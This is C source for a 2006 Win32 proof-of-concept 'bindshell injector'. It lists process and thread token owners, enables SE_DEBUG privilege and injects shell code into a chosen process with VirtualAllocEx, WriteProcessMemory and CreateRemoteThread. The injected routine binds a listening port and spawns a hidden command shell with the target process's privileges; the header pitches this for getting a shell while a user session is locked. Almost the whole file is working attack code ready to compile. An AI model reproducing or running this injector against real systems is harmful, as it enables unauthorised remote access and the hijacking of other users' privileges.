/*
  Static bindshell inyector for Win32 v1.0 - Proof of Concept
  Author: Andres Tarasco Acu�a
  Email:  atarasco @ 514.es - atarasco _@_ sia.es 
  Url:    http://www.514.es
  Date:   February 2006

  Description: This tool enumerates all process and threads running and shows
  their Token owner information.
  Users with SE_DEBUG_NAME privilege should be able to inyect code on local 
  process and execute code with their privileges. This could be useful to
  obtain an intereactive shell (at port 8080) when an user session is locked.

  Compiler: cl /MD threads.c

  Greetings: goes to I�aki Lopez aka ilo-- (http://www.reversing.org) and 514 people
*/

#include "pinjector.h"

/**************************************/
int EnableDebugPriv( HANDLE proceso,LPCTSTR lpName )
{
   HANDLE hToken;
   LUID DebugValue;
   TOKEN_PRIVILEGES tkp;
   
   if ( OpenProcessToken(proceso, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
   {
      if (LookupPrivilegeValue((LPSTR) NULL,lpName,&DebugValue))
      {
        	  tkp.PrivilegeCount = 1;
	        tkp.Privileges[0].Luid = DebugValue;
           tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
           AdjustTokenPrivileges(hToken,FALSE, &tkp,sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL);
           if (GetLastError() == ERROR_SUCCESS)
           {
              return TRUE;
           }
      }
   }
   return FALSE;
}
/****************************************************************************/
void __stdcall shell(PARAMETROS *parametros) {
/*
Static BindShell Code..
Requires KernelGetProcAddress & KernelLoadLibrary memory address to work
   */
   
   STARTUPINFO          si;
   struct               sockaddr_in sa;
   PROCESS_INFORMATION  pi;
   int					s,n;
   WSADATA              HWSAdata;
   
   //winsock
   parametros->WSAHandle=(HANDLE)(*parametros->KernelLoadLibrary)(parametros->wsastring);
   parametros->ShellWsaStartup=(WSASTARTUP)(*parametros->KernelGetProcAddress)((HINSTANCE)parametros->WSAHandle,parametros->wsastartupstring);
   parametros->ShellWSASocket=(WSASOCKET)(*parametros->KernelGetProcAddress)((HINSTANCE)parametros->WSAHandle,parametros->WSASocketString);
   parametros->ShellWsaConnect=(WSACONNECT)(*parametros->KernelGetProcAddress)((HINSTANCE)parametros->WSAHandle,parametros->WSAConnectstring);
   parametros->ShellBind=(BIND)(*parametros->KernelGetProcAddress)((HINSTANCE)parametros->WSAHandle,parametros->bindstring);
   parametros->ShellAccept=(ACCEPT)(*parametros->KernelGetProcAddress)((HINSTANCE)parametros->WSAHandle,parametros->acceptstring);
   parametros->ShellListen=(LISTEN)(*parametros->KernelGetProcAddress)((HINSTANCE)parametros->WSAHandle,parametros->listenstring);
   //kernel32
   parametros->KernelHandle=(HANDLE)(*parametros->KernelLoadLibrary)(parametros->kernelstring);
   parametros->KernelCreateProcess=(CREATEPROCESS)(*parametros->KernelGetProcAddress)((HINSTANCE)parametros->KernelHandle,parametros->CreateProcessstring);
   parametros->ShellWsaStartup(0x101,&HWSAdata);
   s=parametros->ShellWSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,0,0,0);
   sa.sin_family     = AF_INET;
   sa.sin_port       = parametros->port;
   sa.sin_addr.s_addr= 0;
   parametros->ShellBind(s, (struct sockaddr *) &sa, 16);//parametros->sizeofsa);
   parametros->ShellListen(s, 1);
   while(1){
      n= parametros->ShellAccept(s,(struct sockaddr *)&sa,NULL);
      si.cb          = sizeof(si);
      si.wShowWindow = SW_HIDE;
      si.dwFlags     = STARTF_USESHOWWINDOW+STARTF_USESTDHANDLES; // 0x101
      si.hStdInput   = si.hStdOutput = si.hStdError = (void *) n;
      si.lpDesktop = si.lpTitle = (char *) 0x0000;
      si.lpReserved2 = NULL;
      parametros->KernelCreateProcess( NULL ,parametros->cmd,NULL, NULL,TRUE, 0,NULL,NULL,(STARTUPINFO*)&si,&pi);
   }
}
/******************************************************************************/

void __stdcall process_ownerII(OWNER *owner)
{
   HANDLE tproceso;
   DWORD 	dwLen;
   PSID	pSid=0;	// contains the owning user SID
   TOKEN_USER *pWork;
   SID_NAME_USE	use=0;
   
   OpenProcessToken(OpenProcess( PROCESS_ALL_ACCESS, TRUE,owner->pid), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tproceso);
   GetTokenInformation(tproceso, TokenUser, NULL, 0, &dwLen);
   pWork= (TOKEN_USER *)LocalAlloc( LMEM_ZEROINIT,dwLen);
   if (GetTokenInformation(tproceso, TokenUser, pWork, dwLen, &dwLen)) {
      dwLen = GetLengthSid(pWork->User.Sid);
      pSid= (PSID)LocalAlloc( LMEM_ZEROINIT,dwLen);
      CopySid(dwLen, pSid, pWork->User.Sid);
      dwLen=256;
      LookupAccountSid(NULL, pSid, &owner->username[0], &dwLen, &owner->domainname[0], &dwLen, &use);
   }
}
/****************************************************************************/



void __stdcall process_owner(HANDLE htoken, char *data)
{
/*
Extract information from a process Token and dumps owner information.
   */
   DWORD 	dwLen;
   PSID	pSid=0;	// contains the owning user SID
   TOKEN_USER *pWork;
   SID_NAME_USE	use;//=0;
   TCHAR username[256];
   TCHAR domainname[256];
   
   //printf(" HTOKEN: %x",&htoken);
   
   GetTokenInformation(htoken, TokenUser, NULL, 0, &dwLen);
   pWork= (TOKEN_USER *)LocalAlloc( LMEM_ZEROINIT,dwLen);
   if (GetTokenInformation(htoken, TokenUser, pWork, dwLen, &dwLen)) {
      dwLen = GetLengthSid(pWork->User.Sid);
      pSid= (PSID)LocalAlloc( LMEM_ZEROINIT,dwLen);
      CopySid(dwLen, pSid, pWork->User.Sid);
      dwLen=256;
      LookupAccountSid(NULL, pSid, &username[0], &dwLen, &domainname[0], &dwLen, &use);
      printf("%s: \\\\%s\\%s",data,domainname,username);
   }
}
/**************************************************************************/
void ExtractThreadTokens( DWORD dwOwnerPID )
{
   HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
   THREADENTRY32 te32;
   
   if( (hThreadSnap = CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0 )) != INVALID_HANDLE_VALUE )
   {
      te32.dwSize = sizeof(THREADENTRY32 );
      if( Thread32First( hThreadSnap, &te32 ) == TRUE)
      {
         do
         {
            if ( te32.th32OwnerProcessID == dwOwnerPID )
            {
               HANDLE hThread;
               hThread = OpenThread(THREAD_QUERY_INFORMATION , TRUE,te32.th32ThreadID);
               if (hThread!=NULL)
               {
                  HANDLE hToken;
                  if (OpenThreadToken(hThread, TOKEN_QUERY, TRUE, &hToken )!=0)
                  {
                     printf("   %.6i", te32.th32ThreadID );
                     process_owner(hToken,"");
                     CloseHandle(hToken);
                     printf("\n");
                  } else {
                     //printf("   #%.6i\n",te32.th32ThreadID );
                     //doFormatMessage(GetLastError());
                  }
                  CloseHandle(hThread);
               }
            }
         } while( Thread32Next(hThreadSnap, &te32 ) );
         
         CloseHandle( hThreadSnap );
         return;
      }
   }   
}
/**************************************************************************/
void ExtractProcessTokens( void )
{
   
   HANDLE hThreadSnap,SnapShot,proceso,hToken,hThread;//,phandle;
   PROCESSENTRY32		ProcessList;
   THREADENTRY32 te32; 
   DWORD i,tmp;
   
   
   SnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
   ProcessList.dwSize=sizeof(PROCESSENTRY32);
   
   if(Process32First(SnapShot, &ProcessList) == FALSE)
   {
      CloseHandle(SnapShot);	return;
   }
   
   while(1)
   {
      if(Process32Next(SnapShot, &ProcessList) == FALSE)
      {
         CloseHandle(SnapShot);
         break;
      }
      printf("PID %6i %.20s (%3i Threads) ",ProcessList.th32ProcessID,ProcessList.szExeFile,ProcessList.cntThreads);
      proceso=OpenProcess(PROCESS_QUERY_INFORMATION,TRUE,ProcessList.th32ProcessID);
      
      if (proceso!=NULL)
      {
         if(OpenProcessToken(proceso, TOKEN_QUERY, &hToken))
         {
            process_owner(hToken," USER");
            printf("\n");
            CloseHandle(hToken);
            CloseHandle(proceso);
         } else
         {
            printf("\r                                                                          \r");
         }
         ExtractThreadTokens(ProcessList.th32ProcessID);
      } else
      {
         printf("\r                                                                          \r");
      }
   }  
}
/**************************************************************************/
void doFormatMessage( unsigned int dwLastErr )  {
   char cadena[512];
   LPVOID lpMsgBuf;
   FormatMessage(
      FORMAT_MESSAGE_ALLOCATE_BUFFER |
      FORMAT_MESSAGE_IGNORE_INSERTS |
      FORMAT_MESSAGE_FROM_SYSTEM,
      NULL,
      dwLastErr,
      MAKELANGID( LANG_NEUTRAL, SUBLANG_DEFAULT ),
      (LPTSTR) &lpMsgBuf,
      0,
      NULL );
   sprintf(cadena,"ERRORCODE %i: %s\n", dwLastErr, lpMsgBuf);
   printf("Error: %s\n",cadena);
   LocalFree( lpMsgBuf  );
}
/****************************************************************************/

void usage()
{
   wprintf(L"Usage:\n");
   wprintf(L" inject.exe -l                    (Enumerate Credentials)\n");
   wprintf(L" inject.exe -p <pid> <cmd> <port> (Inject into PID)\n");
   //wprintf(L" inject.exe -t <tid> <cmd> <port> (Inject into Thread)\n");
   exit(1);
}
/**************************************************************************/

void main(int argc, char* argv[])
{

   int i;
   BOOL list=0;
   BOOL PID=0;
   BOOL THREAD=1;
   
   /******INJECT CODE******/
   DWORD pid,result;
   HANDLE hProcess,RemoteThread;
   void *p=NULL;
   PARAMETROS parametros,*remote=NULL;
   DWORD MAXINJECTSIZE=4096*2;
   unsigned long write;
   OWNER owner;
   
   wprintf(L"Privilege Switcher for Win32(Private version)\n");
   wprintf(L"(c) 2006 Andres Tarasco - atarasco@gmail.com\n\n");

   if (argc==1) usage();
   
   for(i=1;i<argc;i++)
   {
      if ( (strlen(argv[i]) ==2) && (argv[i][0]=='-') )
      {
         switch(argv[i][1])
         {

         case 'h':
         case 'H':
         case '?':
            usage();
            break;
         case 'l':
         case 'L':
            list=TRUE;
            break;
         case 't':
         case 'T':
            break;
         case 'p':
         case 'P':
            PID=TRUE;
            memset((void *)&parametros,0,sizeof(PARAMETROS));
            pid=atoi(argv[i+1]);

            strncpy(parametros.cmd,argv[i+2],sizeof(parametros.cmd)-1);
            parametros.port=htons((unsigned short)atoi(argv[i+3]));
            break;
         }
      }
   }
      EnableDebugPriv(GetCurrentProcess(),SE_DEBUG_NAME);
      if (list) {
         ExtractProcessTokens();
      }
      //    ImpersonateSelf (SecurityImpersonation);
      
      if (PID)
      {
         //Inicializamos las estructuras de datos
         
         parametros.KernelHandle=LoadLibrary("kernel32.dll");
         parametros.KernelLoadLibrary=(LOADLIBRARY)GetProcAddress((HINSTANCE)parametros.KernelHandle,"LoadLibraryA");
         parametros.KernelGetProcAddress= (GETPROCADDRESS)GetProcAddress((HINSTANCE) parametros.KernelHandle, "GetProcAddress" );
         
         if ( (!parametros.KernelLoadLibrary) || (!parametros.KernelGetProcAddress))
         { wprintf(L"Failed to load Libraries\n");exit(-1); }
         
         //winsock
         strcpy(parametros.wsastring,"ws2_32.dll");
         strcpy(parametros.wsastartupstring,"WSAStartup");
         strcpy(parametros.WSASocketString,"WSASocketW");
         strcpy(parametros.WSAConnectstring,"WSAConnect");
         strcpy(parametros.bindstring,"bind");
         strcpy(parametros.acceptstring,"accept");
         strcpy(parametros.listenstring,"listen");
         //kernel
         strcpy(parametros.kernelstring,"kernel32.dll");
         strcpy(parametros.CreateProcessstring,"CreateProcessA");
         
         
         
         //    EnableDebugPriv();
         EnableDebugPriv(GetCurrentProcess(),SE_DEBUG_NAME);
         //memset((void*)&owner,0,sizeof(OWNER));
         owner.pid=pid;
         //    owner.pid=atoi(argv[1]);
         process_ownerII(&owner);
         
         printf("[+] Trying to execute %s to %i as: %s \\ %s\n",parametros.cmd,
            owner.pid,
            owner.domainname,
            owner.username);
         
         if ( (hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, pid ))!= NULL )
         {
            p = VirtualAllocEx( hProcess, 0, MAXINJECTSIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
            remote = (PARAMETROS *)VirtualAllocEx( hProcess, 0, sizeof(parametros), MEM_COMMIT, PAGE_READWRITE );
            if ( (p!=NULL) && (remote!=NULL) )
            {
               if ( WriteProcessMemory( hProcess, p, &shell, MAXINJECTSIZE, &write )!=0 )
               {
                  if ( WriteProcessMemory( hProcess, remote, &parametros, sizeof(PARAMETROS), &write )!=0 )
                  {
                     RemoteThread=CreateRemoteThread( hProcess, 0, 0, (DWORD (__stdcall *)( void *)) p, remote, 0, &result );
                     if (RemoteThread)
                     {
                        wprintf(L"[+] Code inyected... ; )\n");
                        return;
                     } else
                     {
                        doFormatMessage(GetLastError());
                        wprintf(L"[-] failed Createremotethread\n");
                     }
                  } else
                  {
                     wprintf(L"[-] WriteMemory2 Failed\n");
                  }
               } else
               {
                  wprintf(L"[-] WriteMemory1 Failed\n");
               }
            } else
            {
               wprintf(L"[-] alloc failed\n");
            }
         } else
         {
            wprintf(L"[-] Error. Unable to open pid %i\n",pid);
         }
      }
      
      //   RevertToSelf ();
      //

   wprintf(L"\n");
   return;
   
}
